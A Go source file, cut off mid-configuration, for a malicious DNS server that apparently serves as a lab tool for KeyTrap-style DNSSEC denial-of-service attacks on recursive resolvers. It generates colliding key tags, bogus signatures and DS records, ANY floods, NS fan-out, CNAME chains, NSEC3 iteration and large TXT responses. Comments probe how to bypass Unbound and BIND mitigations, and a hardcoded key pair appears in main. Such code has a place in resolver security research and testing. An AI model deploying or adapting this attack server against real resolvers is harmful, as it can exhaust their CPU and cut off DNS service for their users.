package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/tochusc/xdns"
	"github.com/tochusc/xdns/dns"
	"github.com/tochusc/xdns/dns/xperi"
)

var ServerIP = net.IPv4(10, 10, 1, 3)
var IsNameCompression = false
var IsDNSSEC = true
var InitTime = time.Now().UTC().Unix()

// 测试向量
var ExperiVec = AttackVector{
	CollidedSigNum: 0,
	CollidedZSKNum: 0,
	CollidedKSKNum: 0,
	CollidedDSNum:  0,
	IsDynamicDSNum: false,
	ANYRRSetNum:    0,

	Invalid_DS_KSK_PairNum: 0,
	InvalidCollidedKSKNum:  0,
	InvalidCollidedDSNum:   0,

	TXTRRNum:           0,
	TXTRDataSize:       0,
	CNAMEChainNum:      0,
	NSRRNum:            0,
	IsNSEC:             false,
	NSECRRNum:          0,
	NSEC3ItertationNum: -1,
	// www.atk.test
	// DNSSEC Query: #RRSIG  = CollidedSigNum + 1(Valid)
	// DNSKEY Query: #DNSKEY = #ZSK && #KSK	= CollidedZSKNum + 1(Valid) && CollidedKSKNum + 1(Valid)
	// DS     Query: #DS	 = Invalid_DS_KSK_PairNum * CollidedDSNum + 1(Valid)
	// ANY    Query: #RRSet	 = ANYRRSettNum

	// Adujust AttackVector --> Adjust KeyTrap Attack.

	// KeyTrap Variants:
	// 1. SigJam     (Validation Order✔️)  --> RRSIG* x  DNSKEY   --> CollidedSigNum  					(RRSIG Validation)
	// 2. LockCram   (Validation Order❌)  --> RRSIG  x  DNSKEY*  --> CollidedZSKNum				   	   (RRSIG Validation)
	// 3. KeySigTrap (Validation Order❌)  --> RRSIG* x  DNSKEY*  --> CollidedSigNum, CollidedZSKNum    (RRSIG Validation)
	// 4. HashTrap   (Validation Order✔️)  --> DS*    x  DNSKEY*  --> CollidedDSNum, CollidedKSKNum		(Hash Calculation)
	// X. ANY  	    (No Failure, #RRSet⬆️) --> (RRSIG, DNSKEY)*   --> ANYRRSettNum						(RRSIG Validation)

	// Mitigation
	// Limitaiton:
	// 1. SigJam	  -->  #RRSIG* Limitation
	// 2. LockCram	  -->  #DNSKEY* Limitation
	// 3. KeySigTrap  -->  #RRSIG* && #DNSKEY* Limitation
	// 4. HashTrap    -->  #DS* && #DNSKEY* Limitation
	// X. ANY		  -->  #(RRSIG Val.) Limitation

	// Mechanism:
	// Suspend(Unbound)
	// Workload balance(BIND)

	// X. --> #(RRSIG Val.) Limitation --> Hard to bypass

	// Loophole?
	// Notice:	No (#Hash Cal.) Limitation
	// Only:	#DS* && #DNSKEY* Limitation

	// ANY + HashTrap:
	// HashTrap:	DS* x DNSKEY*
	// ANY:		   (RRSIG, DNSKEY)*
	//
	// HashTrap v2:	(DS, RRSIG)*
	// If possible:	(DS*, RRSIG*)*
	// HashTrap * Deep Delegation.

	// Test config
	// Delegation:
	// test --> atk.test: 80 + 1 DS_KSK_Pair,

	// 80 Invalid DS_KSK_Pair
	// 1  Valid   DS_KSK_Pair  --> which signs ZSK's RRSIG

	// 80 Invalid DS_KSK_Pair config:
	// 10 KegTag== DS (CollidedDSNum)
	// 5  KeyTag== KSK (CollidedKSKNum)

	// 1 Valid DS_KSK_Pair config:
	// 1 Right DS
	// 1 Right KSK
	// Make sure return NOERROR.

	// DS Query:	 80*10 + 1 = 801(SHA384   DS)
	// DNSKEY Query: 80*5  + 1 = 401(ECDSA384 DNSKEY)

	// Size:
	// 801 SHA384   DS  ~60KB
	// 401 ECDSA384 KSK ~60KB  --> RSA... --> #KSK↑

	// #Hash:
	// 80*10*5+1 = 4000 SHA384 (plain text size: ~300B)
}

type KeyTrapResponser struct {
	ResponserLogger *log.Logger
	DNSSECManager   KeyTrapManager
	AttackVector    AttackVector
}

// 攻击向量
type AttackVector struct {
	// SigJam
	CollidedSigNum int
	// LockCram
	CollidedZSKNum int
	// HashTrap
	CollidedKSKNum int
	CollidedDSNum  int
	// ANY
	ANYRRSetNum int

	// HashTrap v2
	Invalid_DS_KSK_PairNum int
	InvalidCollidedKSKNum  int
	InvalidCollidedDSNum   int

	// Deep Delegation
	IsDynamicDSNum bool

	// Tricks
	// Large RRSet
	TXTRRNum int // Resource Record Numer in RRSet
	// Large RDATA
	TXTRDataSize int // RDATA Size in Resource TXTRRNum
	RandomString string

	// Long CNAME Chain
	CNAMEChainNum int // CNAME Chain Number

	// NS Amplification
	NSRRNum            int // Resource Record Numer in RRSet
	IsNSEC             bool
	NSECRRNum          int
	NSEC3ItertationNum int    // NSEC3 Iteration Number
	Salt               string // NSEC3 Salt
}

type KeyTrapManager struct {
	// DNSSEC 配置
	DNSSECConf xdns.DNSSECConfig

	// 区域名与其相应 DNSSEC 材料的映射
	// 在初始化 DNSSEC Responser 时需要为其手动添加信任锚点
	DNSSECMap sync.Map

	// KeyTrap攻击向量
	AttackVec AttackVector
}

// DNSSEC 材料
type DNSSECMaterial struct {
	// Key Tag
	ZSKTag int
	KSKTag int

	// 公钥RDATA
	ZSKRecord dns.DNSResourceRecord
	KSKRecord dns.DNSResourceRecord

	// 私钥字节
	ZSKPriv []byte
	KSKPriv []byte
}

// SignSection 为指定的DNS回复消息中的区域(Answer, Authority, Addition)进行签名
// 其接受参数为：
//   - section []dns.DNSResourceRecord，待签名的区域(Answer, Authority, Addition)信息
//
// 返回值为：
//   - []dns.DNSResourceRecord，签名后的区域(Answer, Authority, Addition)信息
func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSResourceRecord {
	rMap := make(map[string][]dns.DNSResourceRecord)
	for _, rr := range section {
		if rr.Type == dns.DNSRRTypeRRSIG {
			continue
		}
		rid := rr.Name + rr.Type.String() + rr.Class.String()
		rMap[rid] = append(rMap[rid], rr)
	}
	for _, rrset := range rMap {
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		uName := dns.GetUpperDomainName(&rrset[0].Name)
		dMat := m.GetDNSSECMaterial(uName)

		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.DAlgo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.ZSKTag),
				uName,
			)
			section = append(section, wRRSIG)
		}
		sig := m.SignRRSet(rrset)
		section = append(section, sig)
	}
	return section
}

// SignRRSet 为指定的 RR 集合签名
// 其接受参数为
//   - rrset []dns.DNSResourceRecord，RR 集合
func (m *KeyTrapManager) SignRRSet(rrset []dns.DNSResourceRecord) dns.DNSResourceRecord {
	var uName string
	if len(strings.Split(rrset[0].Name, ".")) == 2 {
		if rrset[0].Type == dns.DNSRRTypeNS ||
			rrset[0].Type == dns.DNSRRTypeNSEC ||
			rrset[0].Type == dns.DNSRRTypeNSEC3 {
			uName = rrset[0].Name
		} else {
			uName = dns.GetUpperDomainName(&rrset[0].Name)
		}
	} else {
		uName = dns.GetUpperDomainName(&rrset[0].Name)
	}

	dMat := m.GetDNSSECMaterial(uName)

	sort.Sort(dns.ByCanonicalOrder(rrset))

	sig := xperi.GenerateRRRRSIG(
		rrset,
		dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY).Algorithm,
		uint32(InitTime+86400),
		uint32(InitTime),
		uint16(dMat.ZSKTag),
		uName,
		dMat.ZSKPriv,
	)
	return sig
}

// EnableDNSSEC 为指定的 DNS 查询启用 DNSSEC
// 其接受参数为：
//   - qry dns.DNSMessage，查询信息
//   - resp *dns.DNSMessage，指向指定回复信息的指针
func (m *KeyTrapManager) EnableDNSSEC(qry dns.DNSMessage, resp *dns.DNSMessage) {
	qType := qry.Question[0].Type

	// ANY攻击向量
	if qType == dns.DNSQTypeANY {
		// 生成任意类型的 RR 集合
		anyset := []dns.DNSResourceRecord{}
		var sType = 4096
		for i := 0; i < m.AttackVec.ANYRRSetNum; i++ {
			rr := dns.DNSResourceRecord{
				Name:  qry.Question[0].Name,
				Type:  dns.DNSType(sType + i),
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 10, 10)},
			}
			anyset = append(anyset, rr)
		}
		resp.Answer = append(resp.Answer, anyset...)
	}

	// 签名回答部分
	resp.Answer = m.SignSection(resp.Answer)
	// 签名权威部分
	resp.Authority = m.SignSection(resp.Authority)
	// 签名附加部分
	resp.Additional = m.SignSection(resp.Additional)
	m.EstablishToC(qry, resp)
}

// CreateDNSSECMaterial 生成指定区域的 DNSSEC 材料
// 其接受参数为：
//   - zName string，区域名
//
// 返回值为：
//   - DNSSECMaterial，生成的 DNSSEC 材料
func (m *KeyTrapManager) CreateDNSSECMaterial(zName string) DNSSECMaterial {
	zskRecord, zskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
	zskTag := xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
	for zskTag < uint16(m.AttackVec.CollidedZSKNum) {
		zskRecord, zskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
		zskTag = xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
	}

	kskRecord, kskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
	kskTag := xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))
	for kskTag < uint16(m.AttackVec.Invalid_DS_KSK_PairNum) {
		kskRecord, kskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
		kskTag = xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))
	}

	return DNSSECMaterial{
		ZSKTag: int(zskTag),
		KSKTag: int(kskTag),

		ZSKRecord: zskRecord,
		KSKRecord: kskRecord,

		ZSKPriv: zskPriv,
		KSKPriv: kskPriv,
	}
}

// GetDNSSECMaterial 获取指定区域的 DNSSEC 材料
// 如果该区域的 DNSSEC 材料不存在，则会根据 DNSSEC 配置生成一个
func (m *KeyTrapManager) GetDNSSECMaterial(zName string) DNSSECMaterial {
	dMat, ok := m.DNSSECMap.Load(zName)
	if !ok {
		dMat = m.CreateDNSSECMaterial(zName)
		m.DNSSECMap.Store(zName, dMat)
	}
	return dMat.(DNSSECMaterial)
}

// EstablishToC 根据查询自动添加 DNSKEY，DS，RRSIG 记录
// 自动完成信任链（Trust of Chain）的建立。
// 其接受参数为：
//   - qry dns.DNSMessage，查询信息
//   - m.DNSSECConf DNSSECConfig，DNSSEC 配置
//   - dMap map[string]DNSSECMaterial，区域名与其相应 DNSSEC 材料的映射
//   - resp *dns.DNSMessage，回复信息
func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) error {
	// 提取查询类型和查询名称
	qType := qry.Question[0].Type
	qName := strings.ToLower(qry.Question[0].Name)
	dMat := m.GetDNSSECMaterial(qName)

	if qType == dns.DNSRRTypeDNSKEY {
		// 如果查询类型为 DNSKEY，
		// LockCram攻击向量：CollidedKeyNum
		// 生成 错误ZSK DNSKEY 记录
		rrset := []dns.DNSResourceRecord{}
		if qName != "test" {
			for i := 0; i < m.AttackVec.CollidedZSKNum; i++ {
				wZSK := xperi.GenerateCollidedDNSKEY(
					*dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY),
				)
				rrset = append(rrset, dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeDNSKEY,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(wZSK.Size()),
					RData: &wZSK,
				})
			}
		}

		if qName != "test" {
			// HashTrap攻击向量: CollidedKSKNum
			// 生成 错误KSK DNSKEY 记录
			for i := 0; i < m.AttackVec.CollidedKSKNum; i++ {
				wKSK := xperi.GenerateCollidedDNSKEY(
					*dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY),
				)
				rrset = append(rrset, dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeDNSKEY,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(wKSK.Size()),
					RData: &wKSK,
				})
			}
		}

		rrset = append(rrset, dMat.ZSKRecord, dMat.KSKRecord)

		// HashTrap v2 攻击向量: Invalid_DS_KSK_PairNum
		if qName != "test" {
			for i := 1; i <= m.AttackVec.Invalid_DS_KSK_PairNum; i++ {
				// HashTrap v2攻击向量: InvalidCollidedKSKNum
				// 生成 错误KSK DNSKEY 记录
				for i := 0; i < m.AttackVec.InvalidCollidedKSKNum; i++ {
					wKSK := xperi.GenerateCollidedDNSKEY(
						*dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY),
					)
					rrset = append(rrset, dns.DNSResourceRecord{
						Name:  qName,
						Type:  dns.DNSRRTypeDNSKEY,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: uint16(wKSK.Size()),
						RData: &wKSK,
					})
				}
			}
		}

		// 生成密钥集签名
		sort.Sort(dns.ByCanonicalOrder(rrset))

		sigSet := []dns.DNSResourceRecord{}
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.DAlgo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.KSKTag),
				qName,
			)
			sigSet = append(sigSet, wRRSIG)
		}

		sig := xperi.GenerateRRRRSIG(
			rrset,
			dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY).Algorithm,
			uint32(InitTime+86400),
			uint32(InitTime),
			uint16(dMat.KSKTag),
			qName,
			dMat.KSKPriv,
		)
		sigSet = append(sigSet, sig)
		rrset = append(rrset, sigSet...)

		resp.Answer = append(resp.Answer, rrset...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	} else if qType == dns.DNSRRTypeDS {
		// 如果查询类型为 DS，则生成 DS 记录
		dMat := m.GetDNSSECMaterial(qName)

		rrset := []dns.DNSResourceRecord{}

		// HashTrap v2 攻击
		for i := 0; i < m.AttackVec.Invalid_DS_KSK_PairNum; i++ {
			kskTag := dMat.KSKTag - i
			// HashTrap 攻击向量：InvalidCollidedDSNum
			// 生成 错误DS 记录
			for i := 0; i < m.AttackVec.InvalidCollidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, kskTag, m.DNSSECConf.DAlgo, m.DNSSECConf.DType)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		}

		// HashTrap 攻击向量：CollidedDSNum
		// 生成 错误DS 记录
		if m.AttackVec.IsDynamicDSNum {
			// DS RR Size = QNAME + 10 + RDATA(52)
			// DS RRSet Size = DS RR Size * CollidedDSNum
			// DS RRSet Size <= 65535 Bytes
			// (QNAME + 10 + 52) * CollidedDSNum <= 65535
			// CollidedDSNum <= 65535 / (QNAME + 10 + 52)
			qNameSize := dns.GetDomainNameWireLen(&qName)
			collidedDSNum := 65000 / (qNameSize + 10 + 52)
			for i := 0; i < collidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.DAlgo, m.DNSSECConf.DType)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		} else {
			for i := 0; i < m.AttackVec.CollidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.DAlgo, m.DNSSECConf.DType)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		}

		// 生成正确DS记录
		kskRData, _ := dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY)
		ds := xperi.GenerateRRDS(qName, *kskRData, m.DNSSECConf.DType)
		rrset = append(rrset, ds)
		resp.Answer = append(resp.Answer, ds)

		upName := dns.GetUpperDomainName(&qName)
		dMat = m.GetDNSSECMaterial(upName)

		// 签名
		sort.Sort(dns.ByCanonicalOrder(rrset))

		sigSet := []dns.DNSResourceRecord{}
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.DAlgo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.ZSKTag),
				upName,
			)
			sigSet = append(sigSet, wRRSIG)
		}

		sig := xperi.GenerateRRRRSIG(
			rrset,
			dns.DNSSECAlgorithm(dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY).Algorithm),
			uint32(InitTime+86400),
			uint32(InitTime),
			uint16(dMat.ZSKTag),
			upName,
			dMat.ZSKPriv,
		)

		sigSet = append(sigSet, sig)

		resp.Answer = append(resp.Answer, sigSet...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	}
	xdns.FixCount(resp)
	return nil
}
func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error) {
	// 解析查询信息
	qry, err := xdns.ParseQuery(connInfo)
	if err != nil {
		r.ResponserLogger.Printf("Error parsing query: %v", err)
		return []byte{}, err
	}

	// 将可能启用0x20混淆的查询名称转换为小写
	qName := strings.ToLower(qry.Question[0].Name)
	qType := qry.Question[0].Type
	qClass := qry.Question[0].Class

	r.ResponserLogger.Printf("Recive DNS Query from %s,Protocol: %s,  Name: %s, Type: %s, Class: %s\n",
		connInfo.Address.String(), connInfo.Protocol, qName, qType, qClass)

	// 初始化 NXDOMAIN 回复信息
	resp := xdns.InitNXDOMAIN(qry)
	qLables := strings.Split(qName, ".")

	// Tricks攻击向量：NSRRNum
	if r.AttackVector.NSRRNum > 0 {
		if len(qLables) == 2 {
			lable := qLables[0]
			if len(lable) > 4 && lable[len(lable)-4:len(lable)-1] == "ref" {
				nsNum, err := strconv.Atoi(lable[len(lable)-1:])
				if err != nil {
					r.ResponserLogger.Printf("Error parsing NS number: %v", err)
					return []byte{}, err
				}
				if qType == dns.DNSRRTypeNS {
					rr := dns.DNSResourceRecord{
						Name:  qName,
						Type:  dns.DNSRRTypeNS,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: 0,
						RData: &dns.DNSRDATANS{NSDNAME: qName},
					}
					resp.Answer = append(resp.Answer, rr)
				} else if qType == dns.DNSRRTypeA {
					rr := dns.DNSResourceRecord{
						Name:  qName,
						Type:  dns.DNSRRTypeA,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: 0,
						RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, byte(nsNum))},
					}
					resp.Answer = append(resp.Answer, rr)
				}
				resp.Header.RCode = dns.DNSResponseCodeNoErr
			} else {
				// xxxx.test Referral
				rrset := []dns.DNSResourceRecord{}
				lable := qLables[0]
				for i := 1; i <= r.AttackVector.NSRRNum; i++ {
					// 生成 NS 记录
					rdata := dns.DNSRDATANS{
						NSDNAME: fmt.Sprintf("ns.%sref%d.test", lable, i),
					}
					rr := dns.DNSResourceRecord{
						Name:  qName,
						Type:  dns.DNSRRTypeNS,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: uint16(rdata.Size()),
						RData: &rdata,
					}
					rrset = append(rrset, rr)
				}
				resp.Authority = rrset
				resp.Header.RCode = dns.DNSResponseCodeNoErr
			}
		} else if len(qLables) == 3 {
			rr := dns.DNSResourceRecord{
				Name:  qName,
				Type:  dns.DNSRRTypeNS,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATANS{NSDNAME: fmt.Sprintf("%s.%s", qLables[1], qLables[2])},
			}
			resp.Authority = append(resp.Authority, rr)
			resp.Header.RCode = dns.DNSResponseCodeNoErr
		}

	} else {

		switch qType {
		case dns.DNSRRTypeA:
			// 生成 A 记录
			// Tricks攻击向量：CNAMEChainNum
			cLength := 0
			if len(qLables[0]) > 4 && qLables[0][:5] == "cname" {
				cLength, err = strconv.Atoi(qLables[0][5:])
				if err != nil {
					r.ResponserLogger.Printf("Error parsing CNAME chain length: %v", err)
					return []byte{}, err
				}
			}
			if len(qLables) > 2 && cLength < r.AttackVector.CNAMEChainNum {
				cLength += 1

				nName := fmt.Sprintf("cname%d", cLength)

				for i := 1; i < len(qLables); i++ {
					nName += "." + qLables[i]
				}

				rr := dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeCNAME,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATACNAME{CNAME: nName},
				}

				resp.Answer = append(resp.Answer, rr)
			} else {
				if r.AttackVector.IsNSEC && qLables[0] == "www" {
					// NSEC攻击向量
					upperName := dns.GetUpperDomainName(&qName)
					randInt := rand.Int() % 99
					if r.AttackVector.NSEC3ItertationNum > -1 {
						//生成NSEC3记录
						for i := 1; i < r.AttackVector.NSECRRNum; i++ {
							//生成NSEC3记录
							rdata := dns.DNSRDATANSEC3{
								HashAlgorithm:       1,
								Flags:               1,
								Iterations:          uint16(r.AttackVector.NSEC3ItertationNum),
								SaltLength:          0,
								Salt:                r.AttackVector.Salt,
								HashLength:          0,
								NextHashedOwnerName: fmt.Sprintf("0%d.", randInt+i) + upperName,
								TypeBitMaps:         []dns.DNSType{dns.DNSRRTypeA},
							}
							rr := dns.DNSResourceRecord{
								Name:  fmt.Sprintf("0%d.", randInt+i-1) + upperName,
								Type:  dns.DNSRRTypeNSEC3,
								Class: dns.DNSClassIN,
								TTL:   86400,
								RDLen: 0,
								RData: &rdata,
							}
							resp.Authority = append(resp.Authority, rr)
						}
						rdata := dns.DNSRDATANSEC3{
							HashAlgorithm:       1,
							Flags:               1,
							Iterations:          uint16(r.AttackVector.NSEC3ItertationNum),
							SaltLength:          0,
							Salt:                r.AttackVector.Salt,
							HashLength:          0,
							NextHashedOwnerName: "zzz." + upperName,
							TypeBitMaps:         []dns.DNSType{dns.DNSRRTypeA},
						}
						rr := dns.DNSResourceRecord{
							Name:  fmt.Sprintf("0%d.", randInt+r.AttackVector.NSECRRNum) + upperName,
							Type:  dns.DNSRRTypeNSEC3,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &rdata,
						}
						resp.Authority = append(resp.Authority, rr)
					} else {
						for i := 1; i < r.AttackVector.NSECRRNum; i++ {
							//生成NSEC记录
							rdata := dns.DNSRDATANSEC{
								NextDomainName: fmt.Sprintf("0%d.", randInt+i) + upperName,
								TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
							}
							rr := dns.DNSResourceRecord{
								Name:  fmt.Sprintf("0%d.", randInt+i-1) + upperName,
								Type:  dns.DNSRRTypeNSEC,
								Class: dns.DNSClassIN,
								TTL:   86400,
								RDLen: 0,
								RData: &rdata,
							}
							resp.Authority = append(resp.Authority, rr)
						}
						rdata := dns.DNSRDATANSEC{
							NextDomainName: "zzz." + upperName,
							TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
						}
						rr := dns.DNSResourceRecord{
							Name:  fmt.Sprintf("0%d.", randInt+r.AttackVector.NSECRRNum) + upperName,
							Type:  dns.DNSRRTypeNSEC,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &rdata,
						}
						resp.Authority = append(resp.Authority, rr)
					}
				} else {
					if qLables[0] == "ns" {
						nsNum, err := strconv.Atoi(qLables[1][len(qLables[1])-1:])
						if err != nil {
							r.ResponserLogger.Printf("Error parsing NS number: %v", err)
							return []byte{}, err
						}
						rr := dns.DNSResourceRecord{
							Name:  qName,
							Type:  dns.DNSRRTypeA,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, byte(nsNum))},
						}
						resp.Answer = append(resp.Answer, rr)
					} else {
						rr := dns.DNSResourceRecord{
							Name:  qName,
							Type:  dns.DNSRRTypeA,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &dns.DNSRDATAA{Address: ServerIP},
						}
						resp.Answer = append(resp.Answer, rr)
					}
				}
			}
		case dns.DNSRRTypeNS:
			// 生成 NS 记录
			rr := dns.DNSResourceRecord{
				Name:  qName,
				Type:  dns.DNSRRTypeNS,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATANS{NSDNAME: qName},
			}
			resp.Answer = append(resp.Answer, rr)
		case dns.DNSRRTypeTXT:
			// Tricks攻击向量：TXTRRNum
			for i := 0; i < r.AttackVector.TXTRRNum; i++ {
				rRDATA := []byte{}
				for j := i; j > 0; j /= 256 {
					rRDATA = append(rRDATA, byte(j%256+1))
				}

				rdata := dns.DNSRDATATXT{
					TXT: string(rRDATA),
				}
				rr := dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeTXT,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &rdata,
				}
				resp.Answer = append(resp.Answer, rr)
			}
			// Tricks攻击向量：TXTRDataSize
			if r.AttackVector.TXTRDataSize > 0 {
				rdata := dns.DNSRDATATXT{
					TXT: r.AttackVector.RandomString,
				}
				rr := dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeTXT,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &rdata,
				}
				resp.Answer = append(resp.Answer, rr)
			}
		}
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	}

	// 为回复信息添加 DNSSEC 记录
	if IsDNSSEC {
		r.DNSSECManager.EnableDNSSEC(qry, &resp)
	}

	if r.AttackVector.IsNSEC && qLables[0] == "www" {
		resp.Header.RCode = dns.DNSResponseCodeNXDomain
		upperName := dns.GetUpperDomainName(&qName)
		var rr dns.DNSResourceRecord
		if ExperiVec.NSEC3ItertationNum > -1 {
			//生成NSEC3记录
			rdata := dns.DNSRDATANSEC3{
				HashAlgorithm:       1,
				Flags:               1,
				Iterations:          uint16(ExperiVec.NSEC3ItertationNum),
				SaltLength:          0,
				Salt:                ExperiVec.Salt,
				HashLength:          0,
				NextHashedOwnerName: fmt.Sprintf("00%d.", rand.Int()%99) + upperName,
				TypeBitMaps:         []dns.DNSType{dns.DNSRRTypeA},
			}
			rr = dns.DNSResourceRecord{
				Name:  upperName,
				Type:  dns.DNSRRTypeNSEC3,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &rdata,
			}
		} else {
			//生成NSEC记录
			rdata := dns.DNSRDATANSEC{
				NextDomainName: fmt.Sprintf("00%d.", rand.Int()%99) + upperName,
				TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
			}
			rr = dns.DNSResourceRecord{
				Name:  upperName,
				Type:  dns.DNSRRTypeNSEC,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &rdata,
			}
		}
		resp.Authority = append(resp.Authority, rr)
		dMat := r.DNSSECManager.GetDNSSECMaterial(upperName)
		for i := 0; i < ExperiVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				[]dns.DNSResourceRecord{rr},
				r.DNSSECManager.DNSSECConf.DAlgo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.ZSKTag),
				upperName,
			)
			resp.Authority = append(resp.Authority, wRRSIG)
		}
		sig := xperi.GenerateRRRRSIG(
			[]dns.DNSResourceRecord{rr},
			r.DNSSECManager.DNSSECConf.DAlgo,
			uint32(InitTime+86400),
			uint32(InitTime),
			uint16(dMat.ZSKTag),
			upperName,
			dMat.ZSKPriv,
		)
		resp.Authority = append(resp.Authority, sig)
	}

	// 修正计数字段，返回回复信息
	xdns.FixCount(&resp)

	data := resp.Encode()

	// 是否启用名称压缩
	if IsNameCompression {
		crsp, err := dns.CompressDNSMessage(data)
		if err != nil {
			r.ResponserLogger.Printf("Error compressing response: %v", err)
			return data, nil
		} else {
			return crsp, nil
		}
	} else {
		return data, nil
	}
}

func getRandomString(size int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	charsetLen := len(charset)
	result := make([]byte, size)
	for i := range result {
		result[i] = charset[rand.Intn(charsetLen)]
	}
	return string(result)
}

func main() {
	conf := xdns.DNSServerConfig{
		IP:   ServerIP,
		Port: 53,

		// stdout
		LogWriter: os.Stdout,

		EnebleCache:   false,
		CacheLocation: "./cache",

		PoolCapcity: -1,
	}

	// 生成 KSK 和 ZSK
	// 使用ParseKeyBase64解析预先生成的公钥，
	// 该公钥应确保能够被解析器通过 信任锚（Trust Anchor）建立的 信任链（Chain of Trust） 所验证。
	kskPublic := xperi.ParseKeyBase64("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY")
	kskPriv := xperi.ParseKeyBase64("ppaXHmb7u1jOxEzrLzuGKzbjmSLIK4gEhQOvws+cpBQyJbCwIM1Nrk4j5k94CP9e")

	material := InitMaterial("benign", dns.DNSSECAlgorithmECDSAP384SHA384, kskPublic, kskPriv)

	dMap := sync.Map{}
	dMap.Store("benign", material)

	ExperiVec.RandomString = getRandomString(ExperiVec.TXTRDataSize)

	server := xdns.NewxdnsServer(conf,
		&KeyTrapResponser{
			ResponserLogger: log.New(conf.LogWriter, "KeyTrapResponser: ", log.LstdFlags),
			DNSSECManager: KeyTrapManager{
				DNSSECConf: xdns.DNSSECConfig{
					DAlgo: dns.DNSSECAlgorithmECDSAP384SHA384,
					DType: dns.DNSSECDigestTypeSHA384,
